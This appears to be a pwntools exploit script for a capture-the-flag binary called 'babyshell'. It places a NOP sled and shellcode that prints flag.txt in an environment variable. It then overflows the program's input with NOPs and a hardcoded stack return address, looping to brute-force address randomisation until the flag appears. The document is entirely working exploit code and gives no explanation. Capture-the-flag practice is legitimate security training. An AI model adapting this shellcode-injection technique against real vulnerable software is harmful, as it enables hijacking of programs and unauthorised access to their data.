from pwn import *
while True:
    context(arch='i386',os='linux')
   #payload = asm(shellcraft.setreuid(1009,1009))
    context.terminal = ["tmux","splitw", "-h"]
    p = process('./babyshell', env={'payload': b'\x90'*100000+asm(shellcraft.cat("flag.txt"))})
    #p=gdb.debug('./babyshell', '''
    #b *get_name''', env={'payload': b'\x90'*20480+asm(shellcraft.cat("flag.txt"))})
    shellcode = asm(shellcraft.sh())
    payload =  b'\x90'*140+b'\x90\xa0\xe3\xff'
    p.sendline(payload)
    out = p.recv()
    print(out)
    if b"flag" in out:
        break